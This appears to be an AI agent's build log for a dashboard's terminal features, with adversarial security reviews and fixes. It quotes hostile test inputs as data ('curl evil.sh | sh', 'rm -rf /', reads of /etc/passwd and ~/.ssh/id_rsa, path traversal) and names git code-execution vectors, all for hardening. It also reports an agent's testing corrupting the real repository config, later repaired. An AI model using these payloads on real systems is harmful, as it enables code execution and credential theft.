# Terminal tiers — unattended build log

**Started:** 2026-08-22 · **Mode:** `/head-out` (user away, one question round spent)
**Input spec:** [`docs/terminal-tiers-plan.md`](terminal-tiers-plan.md)

## Contract (the four answers, verbatim)

| Question | User's answer |
|---|---|
| What's the unattended job? | **"Terminal tiers, then a gap hunt"** |
| Build Tier 3 tonight? | **"Hold Tier 3"** |
| How should work be left? | **"open PR and keep them waiting"** |
| Tier 1 host gating? | **"Hide off-localhost, as the plan says"** |

### Discharge

| Clause | Status |
|---|---|
| Step 0 landed alone, first | ✅ `85a21bf` on local `main`, `make check` green (206 tests) |
| Tier 1 built | ⏳ in flight |
| Tier 2 built | ⏳ in flight |
| Tier 3 **NOT** built | ✅ deliberately held per answer 2 |
| Gap hunt after tiers | ⏳ recon running in parallel (read-only) |
| PRs opened, left unmerged | ⏳ pending tier completion |
| Tier 1 hides buttons off-localhost | ⏳ specified to the agent verbatim |

## Assumptions taken without asking

1. **Step 0 fast-forwarded onto local `main`** rather than left on its branch. The three tiers
   are only file-disjoint *after* Step 0 exists on the base they branch from; leaving it on a
   side branch would have made each tier re-create the seam and reintroduce the exact three-way
   conflict Step 0 exists to remove. Verified other sessions' WIP (modified `CLAUDE.md`,
   untracked files) survived the merge untouched.
2. **Agents read the plan by absolute path.** `docs/terminal-tiers-plan.md` is untracked, so it
   does not exist inside a fresh worktree.
3. **No agent may run `make serve` or `pkill`.** Port 8787 has a live process. Every agent
   verifies on its own spare port and kills only the PID it started.
4. **Tier 1's host gate carries a comment** marking it a deliberate, user-approved exception to
   the no-host-gating rule in `.claude/rules/conventions.md`, so a later reader does not "fix" it.
5. **`personal` remote only** — `advisor360` is archived.

## Model assignment (rule 3: cheapest tier that can do the leg)

| Leg | Model | Why not cheaper |
|---|---|---|
| Step 0 | `sonnet` | Spec gives the code verbatim — transcription |
| Tier 1 | `sonnet` | ~40 lines; the one judgment (AppleScript escaping) is pinned by a test |
| Tier 2 | `opus` | Security boundary — no-shell + allowlist correctness is not test-checkable in full |
| Gap recon ×2 | `opus` + `sonnet` | Judgment call, so two models in parallel to reconcile |

---

## Phase 2 — gap hunt

### Recon A (sonnet · server↔client contract, three viewports) — returned

- **(a) host gating: CLEAN.** No `.remote` class survives; the only `location.*` read is
  `app.js:935`, which displays the host in the sidebar footer and gates nothing. Both bugs the
  skill documents as history stay fixed.
- **(b) viewport loss: CLEAN.** Cross-matched every class used in `app.js`/`index.html` against
  every `@media{…display:none…}` rule programmatically. One hit — `.prurl` (`app.css:399`) hidden
  on phone — but that's redundant URL *text*, not a control; the `.prlink` anchor stays clickable.
- **(c) re-derived server policy: ONE REAL GAP.**

**Candidate gap #1 — `/api/list` ships no server clock, so liveness has two sources of truth.**

`/api/session` returns a server `now`, and the detail renderer uses it correctly
(`app.js:1021`). But `all_sessions()` (`registry.py:11-31`, served at `server.py:175-176`)
returns a bare array with **no `now`**, so every sidebar computation falls back to the browser's
wall clock — `app.js:702`, and again at `719/725/746/772/788`, plus the "done" badge at `806`.

*Consequence:* under any clock skew — a phone over the tunnel, a tablet, a drifted desktop — the
sidebar can show a session dead/done while the detail pane shows it live. Same constant, two
clocks, which is functionally the second policy source conventions rule 5 forbids.

*Fix at the seam:* add `now` once to the `/api/list` response shape and have the ~8 `Date.now()`
call sites read it, exactly as `/api/session`'s `d.now` already proves out. ~10-15 lines plus an
assertion that both endpoints' `now` agree.

*Status:* NOT yet started — holding for Recon B (opus, provider-asymmetry angle) so the gap
choice gets reconciled across two models rather than taken on one opinion.

### Recon B (opus · provider asymmetry) — returned, and it is the stronger pass

Recon B opened **real** logs and ran the **real** parsers rather than reasoning from source:
one Claude `.jsonl`, **all 85** `~/.augment/sessions/*.json`, and 6 augment_ext workspaces.

**Root cause it identified, which reframes everything:** `tests/test_selfcheck.py:353` asserts
against a synthetic `"changedFiles": ["/x/myrepo/app.py"]` shape that occurs **zero times**
across all 85 real sessions. A green test guarding a dead feature — exactly the failure
conventions rule 7 exists to prevent. Several "gaps" below are downstream of that one fixture.

| # | Gap | Evidence it's accidental, not genuine absence | Size |
|---|---|---|---|
| B1 | Auggie **Files panel empty for every session** | `sum(len(changedFiles))` = 0 across 85 sessions, while the same logs hold 38 `str-replace-editor` + 13 `save-file` calls with the path in `input_json` | ~20 L |
| B2 | Auggie **commands always green** | `auggie.py:229` comments "Auggie stores no exit status" — factually wrong; every `tool_result_node` carries `is_error`, 4–6 errored per session | ~6 L |
| B3 | `/api/output`,`/api/diff`,`/api/shell`,`/api/agent` **hardwired to Claude** | `find_session("auggie:…")` → None → 404. Clicking any Auggie command errors **today**. Violates conventions rule 3 | ~40 L |
| B4 | Auggie **sub-agents vanish** | `sub-agent-explore` ×6, `sub-agent-general-purpose` ×9 in real logs; sessions record `subAgentCostUsd` | ~5 L |
| B5 | augment_ext **search rows render `undefined×`** | emits 6 keys; the shared renderer reads `title/project/matches/snippet/agent`. Pure shape drift — values already in scope | ~8 L |

**Honest no-list** (checked, dropped as genuine data absence, not padded into findings):
augment_ext transcript/narration (chat is LevelDB), per-task file attribution (shard-id ∩
task-uuid = ∅), augment_ext titles (1 of 39 roots has non-boilerplate subtasks), Auggie
`agents_bg`/`shells` (1 occurrence in 200), Auggie `counts.searches`/`first`/`bg`.

## Reconciliation of the two recon passes

They do **not** overlap; both found real defects. Recon B ranks higher because its findings are
live bugs provable against real data, and because it identified the poisoned fixture upstream of
several of them. Dispatched:

- **Gap agent A (opus)** → B2 + B4 + B1, plus B3 as a hard prerequisite. Instructed: *do not land
  B1 without B3* — a Files panel whose every click 404s is a worse affordance than an empty one.
  Landing B2+B4+B3 and honestly skipping B1 is an acceptable outcome; shipping a broken
  affordance is not.
- **Gap agent B (sonnet)** → B5 + the `gitBranch` one-liner. Confined to `augment_ext.py`; told to
  STOP and report rather than edit any file agent A owns.

## Deferred to your return — deliberately not started

1. **Recon A's liveness gap** (`/api/list` ships no server `now`). Real, ~12 lines, but it edits
   `registry.py`/`server.py`, which gap agent A is holding. Sequencing it after A avoids a
   conflict I would not be around to resolve. This is the next thing to pick up.
2. **B6 — the overview is forked three ways.** `overview.py:build_overview` is imported by
   `auggie.py:6` and never called; Auggie and augment_ext each hand-roll their own. Recon B was
   appropriately skeptical: `overview.where` is rendered nowhere, so most of the loss is
   cosmetic, and much of it disappears once B1/B2/B4 land. Right fix is to delete the two forks
   and call the shared builder — but *after* the parser work, not during.
3. **The `SRC` label map** (`app.js:688`) is client-owned policy the server should own. ~8 lines.
   Low value, bundle it with something else.
4. **augment_ext per-task file accuracy caveat:** every task in a workspace currently shows the
   same workspace-wide file list. Not closeable (no on-disk key ties a shard to a task) but worth
   knowing before trusting that panel.

---

## Tier 1 adversarial review (opus) — verdict REFUTED on one clause

**What held.** The escaping — the part I flagged as the ship-blocker — is clean. 14 adversarial
cwds (embedded `"`, literal newline, CR, trailing backslash, backslash-before-quote, U+2028/9,
`" & (do shell script "id") & "`) all round-tripped exactly through `osascript`; no marker file
was ever created. The reviewer also proved the replace ORDER is load-bearing by counterexample:
swapping it lets a bare `"` close the AppleScript literal early. All **six** mutants went RED on
revert, including the two load-bearing tests.

Argument injection via `sid` is also blocked — a `-r` or `--dangerously-skip-permissions` sid
cannot survive `find_session`'s UUID glob.

**What broke: "local-only" is FALSE.** See the ERRATA appended to `terminal-tiers-plan.md`.
A non-loopback caller reached the route through a forwarder and fired the real `osascript`.
This is a defect in the PLAN, which I propagated verbatim because that was the instruction.

**Also found:** unvalidated `sid` (`session=*` opens a terminal in an unrequested project's cwd);
`AttributeError` on a scalar JSON body; buttons render even when the feature is disabled
(`config.TERMINAL` is never sent to the client — conventions rule 5 inverted).

**Dispatched a fix agent (opus) onto the SAME branch** so Tier 1 stays one PR. Told explicitly
not to add `GET /api/term/status` (Tier 2 is concurrently adding that path) and not to invent
`TRACKER_TERMINAL_REMOTE` (that name belongs to Tier 3).

## Tier 2 built — `c01d214`, 229 tests green

Evidence was strong: real SSE frames with real ANSI colour, byte-cap truncation shown mid-line,
disconnect-reap measured, 429 on a 4th job, 403 when the flag is unset.

**Three deviations it declared, all defensible:**
1. Added `GET /api/term/status` — the SPA otherwise has no way to know the feature is on.
2. Added a shell-metacharacter refusal to `parse_cmd`. Load-bearing: the argv-prefix rule ALONE
   *accepts* `git status && curl evil.sh | sh`, because the prefix is still `git status`.
3. Added `_peer_gone()` — the first write after a peer vanishes lands in the kernel buffer, so
   only the second raises EPIPE; a silent job outlived its reader by >16s before this.

Under two adversarial passes on different models and different angles — one hunting code
execution through allowlisted commands (`git --ext-diff`, `pytest`'s conftest, `make`'s Makefile,
`cat` as an arbitrary file-read), one hunting resource exhaustion (thread pool, job-table growth,
zombies, process-group kill).

## Gap B landed — `3ab42ed`, 209 tests green (baseline 206 + 3)

`augment_ext` search hits went from 6 keys to the full 9 the shared renderer reads. Verified
against real machine data before and after (`search_all("snowflake")`, 20 real augment-vscode
hits): key set now byte-for-byte equal to Claude's and Auggie's. `gitBranch` also filled via the
existing shared `util._git_branch` — a real workspace now reports `develop` instead of `""`.

Landed entirely on the shared PRODUCER shape; `app.js` untouched, so no per-source branch was
introduced. Reused `util._window()` for the snippet rather than inventing new logic.

**The part that matters most:** `tests/test_integration.py` now asserts
`set(r.keys())` is identical across Claude + Auggie + augment-vscode for the same search term.
That is the regression guard that stops the NEXT provider drifting the same way — this bug
existed precisely because nothing checked it.

Proved RED on revert (all three new tests failed with the exact key-diff). **Accepted without a
separate adversarial pass** — it is test-checked, revert-proven, and has no security surface; a
reviewer would have been disproportionate here.

## PR mechanics decided

Remotes confirmed: `personal` (git@github-personal:mepritamm/ai-tracker.git) and `advisor360`
(archived — **skipping**, per the standing note).

Branches are auto-named `worktree-agent-<id>`, which is unreadable in a PR list. Rather than
renaming branches that still have worktrees checked out on them, each push will use an explicit
refspec — `git push personal worktree-agent-xxx:terminal/tier2-command-runner` — so the remote
branch gets a human name with zero local churn.

Planned remote names:
- `terminal/step-0-route-seam` (already on local `main`; may not need its own PR)
- `terminal/tier1-launch`
- `terminal/tier2-command-runner`
- `gap/auggie-parser-fidelity`
- `gap/augment-ext-search-shape`

## Tier 2 adversarial pass 1 (opus · code execution) — no-shell HOLDS, framing REFUTED

**What held.** No bypass of the no-shell property. The reviewer tried leading/trailing/tab
whitespace, `"git" status`, `g'i't status`, bare `git`, `/bin/cat`, `./git`, `../../bin/sh`,
NBSP and Cyrillic look-alikes — all correctly rejected or correctly normalised. `git -c
core.pager=id status` fails the prefix test as designed. `GIT_PAGER=cat` genuinely beats
`core.pager` — that RCE is blocked. XSS in the output pane is clean, including the chunk-boundary
split cases (`ESC[` | `31m<img…>`), which was the likeliest real hole. Both load-bearing tests go
RED on revert.

**What broke: `git diff` is a code-execution primitive.** DEMONSTRATED — the reviewer ran `id`
and wrote a marker file through a literal, fully-allowlisted `parse_cmd("git diff")` → `spawn()`.
The vector is git's external diff driver, named in the working tree's `.git/config` and selected
via `.gitattributes`. No metacharacters, no shell, prefix allowlisted.

The telling detail: the implementer closed the sibling PAGER vector deliberately and missed this
one. "No shell" is not "no code execution" — the allowlist itself contains code-exec primitives.

**Accepted-by-design, stated plainly rather than hidden:** `pytest` runs the cwd's `conftest.py`;
`make check`/`make test` run the cwd's Makefile. Both are code execution the plan knowingly
accepted.

**A composition risk neither review was scoped to see, which I am flagging because it only shows
up when you put the two tiers together:** `cat` is in the default allowlist and takes an absolute
path, so it is an arbitrary file read as your uid. Tier 1's review proved the tunnel presents as
loopback. Therefore `TRACKER_TERMINAL=1` + `make tunnel` + the password = anyone on the internet
with that password can `cat ~/.ssh/id_rsa`. Neither tier is wrong on its own; the combination is.

**Dispatched a hardening agent (opus) on the SAME branch:**
1. Inject `--no-ext-diff --no-textconv` for `git diff/log/show`, reject dangerous git flags
   anywhere in argv, `GIT_CONFIG_NOSYSTEM=1`. Told to REPRODUCE the marker-file attack first and
   show it failing after — a fix not watched to fail first is not verified.
2. **Confine `cat`/`ls` path arguments to the session cwd** (realpath on both sides, so symlinks
   out are caught). *This is me narrowing a plan-approved default* — the user explicitly approved
   the allowlist including `cat`. Flagged for overrule.
3. Narrow `_META` so `git log --grep="a;b"` stops being a false positive, with permission to
   leave it alone if narrowing weakens the boundary.

---

## PARKED FOR YOUR RETURN — PR creation is blocked on credentials

**Branches are pushed. PRs are not created, and I cannot create them.**

Both credentials available to this session resolve to `pmondal_a360`, an **Enterprise Managed
User**, which GitHub refuses to let open a PR on the personal `mepritamm/ai-tracker`:

    GraphQL: Unauthorized: As an Enterprise Managed User, you cannot access this content
    (createPullRequest)

That covers the `gh` keyring login AND the `GITHUB_TOKEN` in `bug-smasher/.env` — they are the
same account. `git push` still works because it goes over SSH under the `github-personal` host
alias, which uses a different key.

**Token usage, per the standing rule:** the `.env` token was used for exactly two calls —
`gh api user` (identity check) and one `createPullRequest` that failed as above. No value printed,
logged, or written.

**What you need to do:** open each PR from its URL below while signed in as `mepritamm`, or
authorize a `mepritamm` token (`gh auth login` as that account) and I can finish it next session.

### Stacking

Step 0 is **local-only** — remote `main` is still `91d92b9`. So every tier/gap branch contains
Step 0's commit. I pushed Step 0 as its own branch and intend the others to be **based on it**,
not on `main`; when you create them, set the base accordingly, or just merge Step 0 first and the
rest will show only their own commits.

Merge order: `terminal/step-0-route-seam` FIRST, then the others in any order (they are
file-disjoint from each other).

## Tier 2 adversarial pass 2 (sonnet · resource lifecycle) — REFUTED in part

This pass found the defect that matters most for a *dashboard* feature, with hard numbers.

**R1 — Tier 2 can wedge the dashboard the user is actually looking at. (HIGH)**
`MAX_JOBS` caps job SPAWNS, not stream SOCKETS. Nothing bounds concurrent `/api/term/stream`
connections, each of which holds a ThreadingHTTPServer thread.

| held connections | `/api/list` |
|---|---|
| baseline | 15–150 ms |
| 656 | 0.23–0.33 s |
| 2152 | 1.45 s |
| **3799** | **`http_code=000`, 8 s client timeout, twice consecutively** |

The plan's §4 rule 3 says the caps exist to stop exactly this. They do not. Server recovered once
connections closed, but the dashboard was unusable throughout.

**R2 — kill-on-disconnect is job-scoped, not viewer-scoped.** Two viewers on one job; close only
viewer A → viewer B, which never disconnected, got `event: end` rc=-9 at t=0.1s. A tab refresh
races identically. The docstring's "the job has no audience: kill it" is false.

**R3 — `Job.kill()` leaks detached grandchildren.** Single `os.kill(pid)`, never `killpg`. The
clean `make check` result was an OS ACCIDENT: `pty.fork()` makes the child a session leader, so
SIGHUP reaches the group when it dies. Proven accidental — a grandchild calling `os.setsid()` and
ignoring SIGHUP **survived**. That is an ordinary daemonizing pattern (`npm test` watchers).

**R4 (low)** `_reap_old()` runs only inside `run()`, so a finished job's buf is pinned until
another job is started. Bounded, but the "TTL" framing is overstated.
**R5 (low)** `TRUNC_MARK` is appended in addition to the capped data → every truncated job
overshoots MAX_BYTES by exactly 33 bytes. UTF-8 split at the cap → U+FFFD mojibake, no crash.

**Confirmed safe with numbers:** TIMEOUT (killed at 3.26s, rc=-9, fd closed, waitpid ran, no
zombie), zombie/fd hygiene at normal scale (fd count 34→34 across 4 jobs in every lifecycle
combination), MAX_JOBS not leaking slots (no permanent 429 lockout), nonexistent/finished job ids
returning in ~5ms without holding threads.

**Handed to the live hardening agent via SendMessage** rather than spawning a second agent on the
same worktree — that would have raced the uncommitted edits it already has in flight.

## Gap A adversarial review (opus) — verdict HOLDS, no ship-blockers

Unusually strong verification, and it ruled out the `sys.path` trap that fooled an earlier
reviewer by asserting `aitracker.__file__` resolved inside the scratch tree on every run.

- **Claude did not regress.** 739 drill-down probes across 45 real `~/.claude/projects` sessions,
  all four route kinds, ids and paths harvested from the parsed sessions themselves:
  **`cmp` byte-identical, 2,198,729 bytes.** The `unified()` move is provably behaviour-preserving.
- **Counts are exact.** An independent walker written straight off the raw JSON (not calling the
  parser's helpers) agreed with `parse_auggie()["counts"]` on **0 mismatches / 85 sessions**.
  Corpus: created 92, edited 100, read 271, errors 95, agents 17.
- **The `_edit_pairs` double-count trap is handled.** Across all 427 real `str-replace-editor`
  calls: 407×1 pair, 11×1 (insert), 8×2, 1×3 — zero yielding zero or only-empty pairs. The 16
  unnumbered `old_str/new_str` calls do not double-count.
- **The new fixture is honest** — verified against the corpus: `input_json` is `str` 3882/3882,
  results land in `request_nodes` 3874/0, `is_error` present 3874/3874, `changedFiles` non-empty
  **0** times.
- **`file=` does not touch disk** — traversal probes returned `[]`.

**The one real defect: `base.py:19-22` documents an existence contract its own defaults do not
enforce.** 10 of 24 bogus-id probes flipped 404 → 200-empty. `test_auggie_drilldown.py:329`
pins the buggy behaviour, so the suite would never catch it.

**Notes it surfaced, now dispatched with the fix:** `reads` is not passed through `_abs()` while
`files` is (13/85 sessions carry both relative and absolute paths for one tree, so the two panels
visibly diverge); `test_selfcheck.py`'s older `c1`/`c2`/`v1` nodes still use a dict `input_json`,
a shape with 0 occurrences in the wild — the same mixed-fixture condition that hid the original
bug; `auggie.py:333`'s `changedFiles` fallback is now dead code.

**Pre-existing hole, widened not created:** `auggie.py:220` joins an unsanitised session id into a
path, so `auggie:../../../../path/to/secret` reads any `.json` on the filesystem and echoes it
through `/api/output`. Reproduces at `85a21bf` via `/api/session`, so this commit did not
introduce it — but it moved from one route to four. Dispatched a ~3-line sanitisation. **The
primary checkout's `/api/session` still has this** and is out of scope for that branch — worth a
follow-up.

## Tier 2 hardening landed — `f96c496` + `cb82444`, 243 tests, all 11 fixes RED-on-revert

### Root cause of the config incident — a trap, not carelessness

Git exports `GIT_DIR`/`GIT_INDEX_FILE` into a **pre-commit hook's** environment. This repo's
pre-commit hook runs the test suite; the new tests shelled out to `git config`/`git commit` in a
temp repo; those inherited vars silently redirected every one of them onto the **real**
repository. Fixed at source with a `_NoInheritedGit` context manager
(`tests/test_term_run.py:190`) that scrubs every `GIT_*` var, verified with a decoy repo that
still had exactly one commit and a clean index afterwards.

This is a better explanation than the one I wrote in the incident section above, and it means the
isolation instruction I gave would not by itself have prevented it.

### Security closures

| Fix | Location |
|---|---|
| `--no-ext-diff --no-textconv` after `diff`/`log`/`show` | `term_run.py:184`, `:97` |
| Dangerous git flags refused anywhere in argv | `term_run.py:103` (`_GIT_BANNED`) |
| `-c` kill switches: fsmonitor, hooksPath, diff.external, pager, editor, gpg.program | `term_run.py:135`, injected at `:184` **after** allowlist validation |
| `GIT_EDITOR=true`, `GIT_CONFIG_NOSYSTEM=1` | `term_run.py:353`, `:357` |
| `cat`/`ls` confined to session cwd | `term_run.py:228`, `:231`, called `:448` |
| `_META` narrowed to *unquoted* metacharacters | `term_run.py:71`, `:74` |

Measured, not assumed: git lets the **last** occurrence win (`git diff --no-ext-diff --ext-diff`
runs the driver; reversed does not) — which is why the injected flags are only sound *alongside*
the `_GIT_BANNED` refusal. And `--no-ext-diff` alone does not stop a `textconv` driver.

Before/after, all three vectors, in a fully isolated sandbox: `core.fsmonitor` via `git status`
MARKER CREATED → none; `core.hooksPath` via `git status` MARKER CREATED → none; external diff via
`git diff` MARKER CREATED → none, and it still produced a real diff.

### Resource lifecycle (R1–R5)

R1 `MAX_STREAMS=24` + 429 · R2 viewer refcount, kill only at zero · R3 `killpg` · R4 sweep from
every route · R5 marker counted inside the byte budget.

**Honest correction from the implementer, which supersedes what I relayed earlier:** it could NOT
reproduce `/api/list` latency degradation — that stayed ~0.1 s in both runs. The real failure is
**thread exhaustion at the process ceiling**, where no request of any kind gets a thread. Same
user-visible outcome as the reviewer's `http_code=000`, but my description of the mechanism was
wrong. Measured: 900 attempted → BEFORE 900 streams accepted / 512 threads; AFTER 24 accepted /
876 × 429 / 27 threads.

### Worst thing a request can still do — the honest answer

Execute arbitrary code **in the session's own project directory**: `make`, `npm test` and `pytest`
run that project's `Makefile`/`package.json`/`conftest.py`. Accepted-by-design, NOT fixed. And if
that project is a repo whose `.git/config` an attacker controls, git can still be steered through
an exec point not enumerated — `filter.<name>.clean/smudge` is the concrete known one, keyed by a
driver name the tree's own `.gitattributes` chooses, so there is no fixed key to override.
Arbitrary-path file reads are gone. A `setsid()` daemoniser started by an allowlisted command
still escapes `killpg`; containing that needs a sandbox this module does not have.

### One follow-up dispatched

The agent identified that `term_run.spawn()` hands the child `os.environ` and therefore has the
**same** `GIT_DIR` exposure — then fixed it only in the tests. Sent back to scrub the inherited
git environment in `spawn()` itself, reusing `_NoInheritedGit`'s key list rather than a second one
that can drift.

## Gap A fixes landed — `3e734b2`, 255 tests, pushed as `gap/auggie-parser-fidelity`

| Defect | Fix | Proof |
|---|---|---|
| 1. exists-vs-empty contract | `Provider.exists(sid)` on the seam (`base.py:19-25`), checked in `drill()` (`registry.py:56-72`); cheap overrides for Claude and Auggie, augment_ext inherits the default | RED on revert; 10 bogus-id probes now 404 again, real-session empties unchanged |
| 2. unanchored `reads` | `_abs()` applied to read paths (`auggie.py:332`), matching `files` | RED on revert via selfcheck |
| 3. fixture residue | `c1`/`c2`/`v1` converted to the real string `input_json`; dead `changedFiles` fallback **deleted** | *no natural RED — see below* |
| 4. path traversal | `_safe_session_id()` rejecting separators, `..`, NUL | RED on revert, reproducing the exact `SECRET-OUTPUT-LEAKED` payload |

**Claude regression: 1,107 probes across 45 real sessions, 0 mismatches** — exceeding the
reviewer's own 739-probe baseline. Byte-identical.

**Two judgement calls worth recording, both good ones:**

1. It reported that defect 3 has **no natural revert-to-RED**, because `_tool_input` handles dict
   and string `input_json` identically by design — and it **declined to fabricate a red test** to
   fill the table, verifying via the untouched `TestToolInput` instead. That is the right answer;
   a manufactured red test would have been worse than an honest gap.
2. It **deleted** the dead `changedFiles` fallback rather than keeping it with a defensive
   comment, reasoning that an untested branch sitting alongside real shapes is exactly the
   condition that hid the original bug. Correct — that is the whole lesson of this gap.

`test_auggie_drilldown.py:329` was **updated, not merely made to pass**: it previously probed two
ids that never existed on disk and asserted the buggy empty response. It now builds a real fixture
to assert the empty-default for a session that genuinely exists, and separately asserts 404 for
ones that do not.

Still out of scope and untouched: `/api/session`'s identical traversal hole on the primary
checkout. Worth a follow-up branch.

---

# CLOSE-OUT

## Contract discharge

| Clause (verbatim) | Verdict |
|---|---|
| "Terminal tiers, then a gap hunt" | ✅ both — Tiers 1 & 2 built and hardened; 2 gaps closed |
| "Hold Tier 3" | ✅ not built. Errata added warning it must not be built against §5 rule 4 as written |
| "open PR and keep them waiting" | ⚠️ **PARTIAL** — 5 branches pushed, **PRs not created**: blocked on credentials (see below) |
| "Hide off-localhost, as the plan says" | ✅ implemented verbatim — and the review then proved the underlying premise false; both the verbatim behaviour and the correction are in the branch |

## Shipped — 5 branches on `personal`, none merged

| Branch | Head | Tests |
|---|---|---|
| `terminal/step-0-route-seam` | `85a21bf` | 206 |
| `terminal/tier1-launch` | `62357bb` | 243 |
| `terminal/tier2-command-runner` | `6dd3f3f` | 244 |
| `gap/auggie-parser-fidelity` | `3e734b2` | 255 |
| `gap/augment-ext-search-shape` | `3ab42ed` | 209 |

Merge `terminal/step-0-route-seam` FIRST; the rest are stacked on it and file-disjoint from each
other.

## The single most important finding of the night

**Every leg passed `make check` green while carrying a real defect.** Not one of these was
catchable by the suite as written:

- a demonstrated RCE through allowlisted `git diff` (external diff driver)
- a second RCE through allowlisted `git status` (`core.fsmonitor` / `core.hooksPath`)
- a "local-only" guarantee defeated by the project's own `make tunnel`
- thread-pool exhaustion that made the whole dashboard unreachable
- a seam contract whose own test **pinned the broken behaviour**
- a fixture asserting a log shape with **0 occurrences in 85 real sessions**

The suites were not wrong; they tested what was written. The adversarial passes tested what was
*claimed*. That gap is where all six lived.

## Assumptions taken without asking

1. Step 0 fast-forwarded onto local `main` — the tiers are only file-disjoint once the seam exists
   on their base.
2. Agents read the plan by absolute path (untracked, so invisible inside a worktree).
3. No agent may run `make serve` or `pkill` (live dashboard, PID 26364, port 8787).
4. `personal` remote only — `advisor360` is archived.
5. Branches pushed under human-readable refspecs rather than renaming checked-out branches.
6. **`cat`/`ls` confined to the session cwd** — a narrowing of a default the plan approved.
7. **`-c` banned anywhere in git argv** — also refuses the legitimate `git log -c`.
8. Deleted the dead `changedFiles` fallback rather than keeping it defensively.

## PARKED — needs you

1. **PR creation.** Both available credentials (`gh` keyring and `bug-smasher/.env`) resolve to
   `pmondal_a360`, an Enterprise Managed User GitHub forbids from opening PRs on
   `mepritamm/ai-tracker`. Authorize a `mepritamm` token and this finishes in one step.
2. **Overrule candidates:** assumptions 6, 7, 8 above.
3. **Tier 3.** Held. Do not build against §5 rule 4 — see the ERRATA in `terminal-tiers-plan.md`.
4. **Recon A's liveness gap** — `/api/list` ships no server clock, so sidebar and detail disagree
   under clock skew (worse over the tunnel). ~12 lines. Next thing to pick up.
5. **`/api/session` path traversal** on the primary checkout — same hole Gap A closed on four
   routes, predates tonight, wants its own branch.
6. **Accepted-by-design, not fixed:** `make`/`pytest`/`npm test` execute the project's own
   `Makefile`/`conftest.py`/scripts. A `setsid()` daemoniser still escapes `killpg`. Tier 2's
   safety rests on `TRACKER_AUTH`, not on the allowlist.

## Incident

An agent's RCE testing wrote into the primary checkout's `.git/config` (`core.bare=true`, a stray
`core.editor` payload, an overwritten `[user]`), misattributing one commit. Root cause was git
exporting `GIT_DIR` into the pre-commit hook environment. Fully repaired; commit re-authored; the
same exposure was then found and closed in `term_run.spawn()` itself. Details above.

---

# SESSION 2 — integration and wiring

## All five branches merged into local `main` — `a2a18a1`, zero conflicts

`make check` on the INTEGRATED tree: **333 tests, `selfcheck ok`**. Each branch was green alone;
this is the first proof they are green together.

## End-to-end wiring proof (throwaway port 8899, `TRACKER_TERMINAL=1`, killed after)

**Page assembly** — both tiers' assets inlined at startup, all three mounts present
(`id=ext_launch`, `id=ext_run`, `id=ext_vt`).

**Tier 2, live:**

    POST /api/term/run {"cmd":"git status"}  -> {"job":"9da73a53667f"}
    GET  /api/term/stream?job=...
      data: {"b": "On branch AIO-3628/disclosure-and-checkpoint-binding\r\n..."}
      event: end
      data: {"rc": 0, "truncated": false}

    "git status; rm -rf /"  -> refused: unquoted shell metacharacter ';'
    "cat /etc/passwd"       -> refused: resolves outside the session directory

**Tier 1, every gate:**

    X-Forwarded-For present -> refused: request appears to be proxied
    session "*"             -> bad session id
    auggie: + resume        -> resume is Claude-only
    body "just-a-string"    -> bad body: expected a JSON object
    no auth                 -> HTTP 401

**Tier 1, live launch** (`cwd` mode, deliberately not `resume`, to avoid starting a Claude session):

    POST /api/term/open {"mode":"cwd"} -> {"ok": true}
    -> Terminal opened at
       /Users/…/VIDA20/repos/dw-vida-ai/.claude/worktrees/AIO-3605

Both tiers work end-to-end on the merged tree.

## In flight

- shared path-component sanitiser (closes the remaining `augment_ext` traversal; `auggie`'s is
  already closed by the Gap A merge)
- liveness: `/api/list` carries the server clock
- `tracker-push` skill rewritten for a single remote + both skills installed as symlinks

## Skills reconciled + advisor360 retired

**My premise was backwards.** I assumed the repo skill copy was authoritative because it is
version-controlled. In fact:

- `tracker-push`: the GLOBAL copy (Jul 15) was newer and already rewritten for a single remote,
  but had dropped the EMU explanation for why `personal` is a direct push. The agent used the
  newer global structure and reinstated the EMU rationale with the verified error text.
- `tracker-gap`: the REPO copy (Aug 17) was a strict superset (viewport/host-gating sections,
  `pins.json`/`notes.json`). The one unique sentence in the global copy was merged in, not
  discarded.

Both now installed as symlinks `~/.claude/skills/tracker-{push,gap}` → the repo copies, so they
cannot drift again. Backups of the pre-existing globals in `scratchpad/skills-backup/`.

**`.claude/skills/tracker-push/` is gitignored** (`.gitignore:10-11`, with
`tracker-add-contributor`). So the authoritative copy is NOT in git and will not survive a fresh
clone. **User's call: leave it ignored.** `tracker-gap` IS tracked.

**advisor360 retired, per the user's decision:**
- `.git/hooks/pre-push` DELETED — it existed solely to block a LICENSE reaching advisor360, so
  removing the block removed the hook's entire purpose. Backup: `scratchpad/pre-push.backup`.
- `git remote remove advisor360` — remote and all `refs/remotes/advisor360/*` gone.
- `.git/hooks/pre-commit` (the `make check` gate) deliberately PRESERVED.
- **10 local `a360/*` branches LEFT ALONE** — now ordinary local branches with no upstream.
  Deleting branches is destructive and was not asked for; `git branch -d` will refuse any holding
  unmerged work.

## Path traversal closed at the shared seam — `1771859`, 347 tests

Sent after `augment_ext`; found something bigger. **Claude's `find_session()`
(`providers/claude.py:10`) — the main provider — had TWO holes**, both reachable from
`/api/session` and all four drill-downs, since everything funnels through it:

1. **Glob disclosure.** `sid="*"` (or `?`, `[...]`) matched an **arbitrary sibling session in an
   arbitrary project directory**. No filesystem escape needed — a pure cross-session
   confidentiality break.
2. **Real traversal.** `sid="../../outside/passwd"` backed out of the matched project directory
   and reached files outside `config.PROJECTS` entirely.

Real ids are bare uuids in every provider (verified against `~/.claude/projects/*/*.jsonl`,
`~/.augment/sessions/*.json`, and VSCode `workspaceStorage/<hash>`), so rejecting `*?[]` breaks
nothing legitimate.

**The fix is one helper, not four.** `util.safe_path_component()` (`util.py:6-30`) rejects
empty/NUL/`/`/`\`/`os.sep`/`os.altsep`/`..`/`*?[]`. Applied at:

- `claude.py:10-19` — before `glob.glob()`
- `augment_ext.py:183-193` — both `ws` AND `uu`, before either path join
- `auggie.py:219-224` — the former local `_safe_session_id` is now a one-line alias, so there is
  no second implementation left to drift

Scope finding worth keeping: `augment_ext`'s `_list`/`_search` were never vulnerable — they
iterate `ws` values from `os.listdir()`, which is filesystem-derived, never URL-derived. `_parse()`
was the sole fix point, and since `base.Provider.exists()` defaults to calling `parse()`, fixing it
closed every reachable route for that provider.

**RED-on-revert, three separate scratch snapshots, each leaking a real payload when reverted:**
`find_session("*")` returning a sibling session's path; the augment_ext dict literally containing
`SECRET-LEAKED-IF-READABLE`; `_load_auggie("../secret")` returning `{"SECRET": "LEAKED-IF-READABLE"}`.

Verified live on `main` after merge: `find_session` blocks `*`, `?`, and `../../etc/hosts`;
